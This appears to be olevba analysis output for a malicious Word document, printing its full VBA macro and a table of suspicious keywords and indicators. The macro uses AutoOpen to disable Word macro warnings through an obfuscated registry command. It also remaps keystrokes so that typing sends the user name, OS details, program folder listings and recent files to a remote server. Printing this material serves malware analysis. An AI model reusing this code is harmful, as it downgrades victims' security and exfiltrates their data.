olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Stratos.gen-22dd253059418b02367aadb10e071d5c4edaf7cf12876538330d7990e38e2409
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare PtrSafe Sub WinExec Lib "kernel32.dll" (ByVal cmd As String, ByVal opcode As Integer)


Dim qazwsx   As Integer





Function aaaaaaaaaaaa(ByVal InputStr)
     Const ConstStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
     Dim dataLength, sOut, groupBegin
  
     InputStr = Replace(InputStr, vbCrLf, "")
     InputStr = Replace(InputStr, vbTab, "")
     InputStr = Replace(InputStr, " ", "")
     dataLength = Len(InputStr)
     
     For groupBegin = 1 To dataLength Step 4
          Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
          numDataBytes = 3
          nGroup = 0
        
          For CharCounter = 0 To 3
               thisChar = Mid(InputStr, groupBegin + CharCounter, 1)
            
               If thisChar = "=" Then
                    numDataBytes = numDataBytes - 1
                    thisData = 0
               Else
                    thisData = InStr(1, ConstStr, thisChar, vbBinaryCompare) - 1
               End If
  
               If thisData = -1 Then

                    Exit Function
               End If
            
               nGroup = 64 * nGroup + thisData
          Next
          nGroup = Hex(nGroup)
          nGroup = String(6 - Len(nGroup), "0") & nGroup
          pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
                    Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
                    Chr(CByte("&H" & Mid(nGroup, 5, 2)))
          sOut = sOut & Left(pOut, numDataBytes)
     Next
     aaaaaaaaaaaa = sOut
End Function


Function edcrfv(fgtredcvb As String) As String
    
    On Error Resume Next
    Dim nhbgvfc As Integer
    Dim fvgbhnjm As Integer
    Dim fnhgbjm As String
    lijhygt = ""
    nhbgvfc = 0

     
    fnhgbjm = Dir(fgtredcvb & "*.*", vbDirectory)
    Dim fileType As String
    Do While ((fnhgbjm) <> "")
        If ((fnhgbjm <> ".") And (fnhgbjm <> "..")) Then
            lijhygt = lijhygt + " - " + fnhgbjm
        End If
        nhbgvfc = nhbgvfc + 1
        fnhgbjm = Dir(fgtredcvb & "*.*", vbDirectory)
        Do While (fvgbhnjm < nhbgvfc And fnhgbjm <> "")
            fnhgbjm = Dir
            fvgbhnjm = fvgbhnjm + 1
        Loop
        fvgbhnjm = 0
    Loop
     edcrfv = lijhygt
End Function
Function tgbyhn()

On Error Resume Next
     
     
List = ""

Dim oRecentFile As RecentFile

If RecentFiles.Count >= 1 Then
   
    For Each oRecentFile In RecentFiles
        List = List & oRecentFile.Path & "\" & oRecentFile.Name & " - "
    Next oRecentFile
End If


tgbyhn = List

End Function

Function rdxcftgb(strCmd)
On Error Resume Next

str1 = aaaaaaaaaaaa("V3NjcmlwdC5zaGVsbA")
str1 = Left$(str1, InStr(str1, vbNullChar) - 1)

Set vfredcbgtyhn = CreateObject(str1)
vfredcbgtyhn.Run strCmd, Right(Left("jlfgh0dgj0dgkdg0dt345gv567", 6), 1), False

End Function

Sub AutoOpen()
On Error Resume Next

str1 = aaaaaaaaaaaa("cmVnLmV4ZSBhZGQgSEtFWV9DVVJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XE9mZmljZVw")
str1 = Left$(str1, InStr(str1, vbNullChar) - 1)
str2 = aaaaaaaaaaaa("XFdvcmRcU2VjdXJpdHlcIC92IFZCQVdhcm5pbmdzIC90IHJlZ19kd29yZCAvZCAxIC9m")
str2 = Left$(str2, InStr(str2, vbNullChar) - 1)
cmd = str1 & Application.Version & str2
rdxcftgb (cmd)
qazwsx = 0

End Sub


Function ujmikl()
 On Error Resume Next
    If (qazwsx = 0) Then
    
        vfgbvcd = Application.Version
        uname = Application.UserName
        os = System.OperatingSystem
        sv = System.Version
        rdxvdw = edcrfv(aaaaaaaaaaaa("QzpcXFByb2dyYW0gRmlsZXNcXA"))
        ki87ujhy = edcrfv(aaaaaaaaaaaa("QzpcXFByb2dyYW0gRmlsZXMgKHg4NilcXA"))
        recent = tgbyhn
        dfresxcvfd = aaaaaaaaaaaa("aHR0cDovL2hhbmxpZ2h0Lm15Z2FtZXNvbmxpbmUub3JnLzI0MDMvdi5waHA=")
        who = "sn6899"
        drl = dfresxcvfd & "?w=" & who & "&rdxvdw=" & rdxvdw & "&ki87ujhy=" & ki87ujhy & "&r=" & recent & "&msv=" & vfgbvcd & "&un=" & uname & "&os=" & os & "&sv=" & sv
    
        Dim eszrdx
        Object = aaaaaaaaaaaa("TVNYTUwyLlNlcnZlclhNTEhUVFAuNi4w")
        
        Set eszrdx = CreateObject(Object)
        eszrdx.Open "GET", drl, False
        eszrdx.Send
        qazwsx = 1
        End If
   
End Function




Function ujmlkl()
 On Error Resume Next
    If (qazwsx = 7) Then
        vfgbvcd = Application.Version
        uname = Application.UserName
        os = System.OperatingSystem
        sv = System.Version
        rdxvdw = edcrfv(aaaaaaaaaaaa("QzpcXFByb2dyYW0gRmlsZXNcXA"))
        ki87ujhy = edcrfv(aaaaaaaaaaaa("QzpcXFByb2dyYW0gRmlsZXMgKHg4NilcXA"))
        recent = tgbyhn
        dfresxcvfd = aaaaaaaaaaaa("aHR0cDovLzIwMC4yMDAuMjAwLjIwMC90ZXN0L3YucGhw")
        who = "sn6899"
        drl = dfresxcvfd & "?w=" & who & "&rdxvdw=" & rdxvdw & "&ki87ujhy=" & ki87ujhy & "&r=" & recent & "&msv=" & vfgbvcd & "&un=" & uname & "&os=" & os & "&sv=" & sv
        Dim eszrdx
        Object = aaaaaaaaaaaa("ZmlsZXN5c3RlbTo6aW8")
        Set eszrdx = CreateObject(Object)
        eszrdx.Open "GET", drl, False
        eszrdx.Send
        qazwsx = 1
        End If
End Function


Sub FLL()

    Selection.TypeText Text:="a"
   ujmlkl
End Sub
Sub G9W()

    Selection.TypeText Text:="b"
   ujmlkl
End Sub
Sub GEA()

    Selection.TypeText Text:="c"
   ujmlkl
End Sub
Sub GJA()

    Selection.TypeText Text:="d"
   ujmlkl
End Sub
Sub HFG()

    Selection.TypeText Text:="e"
   ujmlkl
End Sub
Sub HMD()

    Selection.TypeText Text:="f"
   ujmlkl
End Sub
Sub IWE()

    Selection.TypeText Text:="i"
   ujmlkl
End Sub
Sub JFG()

    Selection.TypeText Text:="j"
   ujmlkl
End Sub
Sub JGL()

    Selection.TypeText Text:="k"
   ujmlkl
End Sub
Sub JGY()

    Selection.TypeText Text:="l"
   ujmlkl
End Sub
Sub JNF()

    Selection.TypeText Text:="m"
   ujmlkl
End Sub
Sub KFG()

    Selection.TypeText Text:="n"
   ujmlkl
End Sub
Sub KGH()

    Selection.TypeText Text:="o"
   ujmlkl
End Sub
Sub KJE()

    Selection.TypeText Text:="p"
   ujmlkl
End Sub
Sub KSA()

    Selection.TypeText Text:="q"
   ujmlkl
End Sub
Sub KYP()

    Selection.TypeText Text:="r"
   ujmlkl
End Sub
Sub SLK()

    Selection.TypeText Text:="t"
   ujmlkl
End Sub
Sub THS()

    Selection.TypeText Text:="u"
   ujmlkl
End Sub
Sub W3I()

    Selection.TypeText Text:="v"
   ujmlkl
End Sub
Sub WSE()

    Selection.TypeText Text:="w"
   ujmlkl
End Sub
Sub ASN()

    Selection.TypeText Text:="y"
   ujmlkl
End Sub
Sub DF8()

    Selection.TypeText Text:="z"
   ujmlkl
End Sub
Sub IHI()

    Selection.TypeText Text:="h"
   ujmlkl
End Sub
Sub AKS()

    Selection.TypeText Text:="x"
   ujmlkl
End Sub
Sub HSL()

    Selection.TypeText Text:="g"
   ujmlkl
End Sub
Sub ESH()

    Selection.TypeText Text:="1"
    ujmikl
End Sub
Sub F8G()

    Selection.TypeText Text:="2"
    ujmikl
End Sub
Sub FDG()

    Selection.TypeText Text:="3"
    ujmikl
End Sub
Sub FGH()

    Selection.TypeText Text:="4"
    ujmikl
End Sub
Sub FGJ()

    Selection.TypeText Text:="5"
    ujmikl
End Sub
Sub FGM()

    Selection.TypeText Text:="6"
    ujmikl
End Sub
Sub FGU()

    Selection.TypeText Text:="7"
    ujmikl
End Sub
Sub FJG()

    Selection.TypeText Text:="8"
    ujmikl
End Sub
Sub FKJ()

    Selection.TypeText Text:="9"
    ujmikl
End Sub
Sub ERH()

    Selection.TypeText Text:="0"
    ujmikl
End Sub
Sub JTO()

    Selection.TypeText Text:="-"
    ujmikl
    
End Sub
Sub KJP()

    Selection.TypeText Text:="="
    ujmikl
End Sub
Sub G8I()

    Selection.TypeBackspace
    ujmikl
End Sub
Sub JHL()

    Selection.TypeText Text:="["
End Sub
Sub LDK()

    Selection.TypeText Text:="]"
End Sub
Sub G9Y()

    Selection.TypeText Text:="B"
   ujmlkl
End Sub
Sub GJL()

    Selection.TypeText Text:="D"
   ujmlkl
End Sub
Sub HIT()

    Selection.TypeText Text:="E"
   ujmlkl
End Sub
Sub HSJ()

    Selection.TypeText Text:="F"
   ujmlkl
End Sub
Sub IER()

    Selection.TypeText Text:="G"
   ujmlkl
End Sub
Sub IRJ()

    Selection.TypeText Text:="H"
   ujmlkl
End Sub
Sub JFB()

    Selection.TypeText Text:="I"
   ujmlkl
End Sub
Sub JGK()

    Selection.TypeText Text:="J"
   ujmlkl
End Sub
Sub JGS()

    Selection.TypeText Text:="K"
   ujmlkl
End Sub
Sub JLA()

    Selection.TypeText Text:="L"
   ujmlkl
End Sub
Sub KDJ()

    Selection.TypeText Text:="M"
   ujmlkl
End Sub
Sub KFJ()

    Selection.TypeText Text:="N"
   ujmlkl
End Sub
Sub KRO()

    Selection.TypeText Text:="P"
   ujmlkl
End Sub
Sub KUJ()

    Selection.TypeText Text:="Q"
   ujmlkl
End Sub
Sub LKF()

    Selection.TypeText Text:="R"
   ujmlkl
End Sub
Sub REI()

    Selection.TypeText Text:="S"
   ujmlkl
End Sub
Sub TGS()

    Selection.TypeText Text:="T"
   ujmlkl
End Sub
Sub UIG()

    Selection.TypeText Text:="U"
   ujmlkl
End Sub
Sub WGY()

    Selection.TypeText Text:="V"
   ujmlkl
End Sub
Sub YGA()

    Selection.TypeText Text:="W"
   ujmlkl
End Sub
Sub ASJ()

    Selection.TypeText Text:="X"
   ujmlkl
End Sub
Sub BKS()

    Selection.TypeText Text:="Y"
   ujmlkl
End Sub
Sub DFJ()

    Selection.TypeText Text:="Z"
   ujmlkl
End Sub
Sub FUE()

    Selection.TypeText Text:="A"
   ujmlkl
End Sub
Sub KJD()

    Selection.TypeText Text:="O"
   ujmlkl
End Sub
Sub QWE()

    Selection.TypeText Text:="\"
    ujmikl
End Sub
Sub KUY()

    Selection.TypeText Text:=";"
    ujmikl
End Sub
Sub SWR()

    Selection.TypeText Text:="'"
   ujmlkl
End Sub
Sub GIR()

    Selection.TypeText Text:=","
   ujmlkl
End Sub
Sub GLS()

    Selection.TypeText Text:="."
   ujmlkl
End Sub
Sub GAL()

    Selection.TypeText Text:="/"
   ujmlkl
End Sub
Sub LSK()

    Selection.TypeText Text:="@"
    ujmikl
End Sub
Sub MLD()

    Selection.TypeText Text:="#"
    ujmikl
End Sub
Sub MNA()

    Selection.TypeText Text:="$"
    ujmikl
End Sub
Sub MND()

    Selection.TypeText Text:="%"
    ujmikl
End Sub
Sub NLD()

    Selection.TypeText Text:="^"
    ujmikl
End Sub
Sub OHW()

    Selection.TypeText Text:="&"
    ujmikl
End Sub
Sub OJE()

    Selection.TypeText Text:="*"
    ujmikl
End Sub
Sub OYJ()

    Selection.TypeText Text:="("
    ujmikl
End Sub
Sub LKS0()

    Selection.TypeText Text:=")"
    ujmikl
End Sub
Sub RUI()

    Selection.TypeText Text:="_"
    ujmikl
End Sub
Sub RLK()

    Selection.TypeText Text:="+"
    ujmikl
End Sub
Sub RTJ()

    Selection.TypeText Text:="{"
    ujmikl
End Sub
Sub SFG()

    Selection.TypeText Text:="}"
    ujmikl
End Sub
Sub SKD()

    Selection.TypeText Text:="|"
    ujmikl
End Sub
Sub SDL()

    Selection.TypeText Text:=":"
    ujmikl
End Sub
Sub SLD()

    Selection.TypeText Text:=""""
End Sub
Sub RGH()

    Selection.TypeText Text:="<"
    ujmikl
End Sub
Sub RJG()

    Selection.TypeText Text:=">"
    ujmikl
End Sub
Sub RFU()
    Selection.TypeText Text:="?"
    ujmikl
End Sub
Sub LKS()
    Selection.TypeText Text:="s"
    ujmikl
End Sub
Sub LQW()
    Selection.TypeText Text:="!"
    ujmikl
End Sub
Sub GFN()
    Selection.TypeText Text:="C"
End Sub
Sub GKJ()

    Selection.Delete Unit:=wdCharacter, Count:=1
    ujmikl
End Sub
Sub ISE()

    Selection.HomeKey Unit:=wdLine
    ujmikl
End Sub
Sub HLK()
    Selection.EndKey Unit:=wdLine
    ujmikl
End Sub
Sub KJG()

    Selection.MoveUp Unit:=wdScreen, Count:=1
    ujmikl
End Sub
Sub TWQ()

    Selection.MoveUp Unit:=wdLine, Count:=1
    ujmikl
End Sub
Sub GQU()

    Selection.MoveDown Unit:=wdLine, Count:=1
    ujmikl
End Sub
Sub JKG()

    Selection.MoveLeft Unit:=wdCharacter, Count:=1
    ujmikl
End Sub
Sub LKD()

    Selection.MoveRight Unit:=wdCharacter, Count:=1
    ujmikl
End Sub
Sub vfdc()
Attribute vfdc.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.vfdc"
Selection.Paste
    ujmikl
End Sub
Sub vfdds()
Attribute vfdds.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.vfdds"
    Selection.Paste
    ujmikl
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|MSXML2.ServerXMLHTTP|May download files from the Internet         |
|          |                    |(obfuscation: Base64)                        |
|Suspicious|VBAWarnings         |May attempt to disable VBA macro security and|
|          |                    |Protected View (obfuscation: Base64)         |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |http://hanlight.myga|URL (obfuscation: Base64)                    |
|          |mesonline.org/2403/v|                                             |
|          |.php                |                                             |
|IOC       |http://200.200.200.2|URL (obfuscation: Base64)                    |
|          |00/test/v.php       |                                             |
|IOC       |200.200.200.200     |IPv4 address (obfuscation: Base64)           |
|Base64    |\Word\Security\ /v  |XFdvcmRcU2VjdXJpdHlcIC92IFZCQVdhcm5pbmdzIC90I|
|String    |VBAWarnings /t      |HJlZ19kd29yZCAvZCAxIC9m                      |
|          |reg_dword /d 1 /f   |                                             |
|Base64    |http://hanlight.myga|aHR0cDovL2hhbmxpZ2h0Lm15Z2FtZXNvbmxpbmUub3JnL|
|String    |mesonline.org/2403/v|zI0MDMvdi5waHA=                              |
|          |.php                |                                             |
|Base64    |MSXML2.ServerXMLHTTP|TVNYTUwyLlNlcnZlclhNTEhUVFAuNi4w             |
|String    |.6.0                |                                             |
|Base64    |http://200.200.200.2|aHR0cDovLzIwMC4yMDAuMjAwLjIwMC90ZXN0L3YucGhw |
|String    |00/test/v.php       |                                             |
+----------+--------------------+---------------------------------------------+

